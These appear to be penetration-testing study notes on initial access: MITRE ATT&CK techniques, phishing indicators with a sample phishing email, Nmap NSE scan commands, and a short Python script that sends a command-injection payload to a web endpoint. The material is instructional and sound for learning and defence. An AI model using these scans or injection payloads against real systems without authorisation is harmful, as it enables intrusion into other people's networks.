# Initial Access and Internal Recon

## Understand How Initial Access Fits into the MITRE Matrix

The MITRE ATT&CK framework is a comprehensive matrix of tactics and techniques used by adversaries to carry out cyberattacks. Initial access is the first tactic in the matrix, focusing on gaining entry into a target network.

### Key Techniques

- **Phishing**: Sending malicious emails to trick users into revealing credentials or downloading malware.
- **Exploit Public-Facing Applications**: Exploiting vulnerabilities in internet-facing applications to gain access.
- **Drive-by Compromise**: Compromising a website to deliver malware to visitors.

### Example

- **Scenario**: An attacker uses a phishing email to deliver a malicious payload that exploits a vulnerability in a public-facing application, providing initial access to the target network.

## Recognize Phishing Emails and Understand Why Attackers Use Them to Obtain Initial Access

Phishing emails are fraudulent messages designed to trick recipients into revealing sensitive information or downloading malware. Attackers use phishing because it is a low-cost, high-reward method to gain initial access.

### Key Indicators of Phishing Emails

- **Suspicious Sender**: The email is from an unknown or unexpected sender.
- **Urgent Language**: The email uses urgent or threatening language to prompt immediate action.
- **Malicious Links**: The email contains links that lead to malicious websites.
- **Attachments**: The email includes unexpected attachments that may contain malware.

### Example

- **Phishing Email**:
  ```plaintext
  From: support@example.com
  Subject: Urgent: Update Your Account Information

  Dear User,

  We have detected suspicious activity on your account. Please click the link below to update your information immediately:

  [Update Account](http://malicious-link.com)

  Thank you,

## Perform Advanced Nmap Scans with NSE Scripts

Nmap (Network Mapper) is a powerful tool for network discovery and security auditing. Nmap Scripting Engine (NSE) allows users to write and use scripts to automate various network tasks.

### Example

- **Basic Nmap Scan**:
  ```bash
  nmap -sV example.com
  ```

- **Advanced Nmap Scan with NSE Script**:
  ```bash
  nmap --script vuln example.com
  ```
  - **Explanation**: This command uses the `vuln` script to scan for vulnerabilities on the target `example.com`.

### Common NSE Scripts

- **http-enum**: Enumerates directories used by web servers.
  ```bash
  nmap --script http-enum example.com
  ```

- **ftp-anon**: Checks for anonymous FTP login.
  ```bash
  nmap --script ftp-anon example.com
  ```

## Exploit a Machine with a Python Script

Python is a versatile programming language that can be used to write scripts for exploiting vulnerabilities.

### Example

- **Vulnerable Application**: A web application with a command injection vulnerability.

- **Python Exploit Script**:
  ```python
  import requests

  target_url = "http://example.com/vulnerable_endpoint"
  command = "id"

  payload = {"input": f"; {command} ;"}

  response = requests.post(target_url, data=payload)

  print(response.text)
  ```

- **Explanation**: This script sends a POST request to the vulnerable endpoint with a payload that includes a command injection. The response from the server is printed, showing the result of the injected command.

By understanding these concepts and using these tools, you can effectively perform initial access and internal reconnaissance activities, enhancing your penetration testing skills.
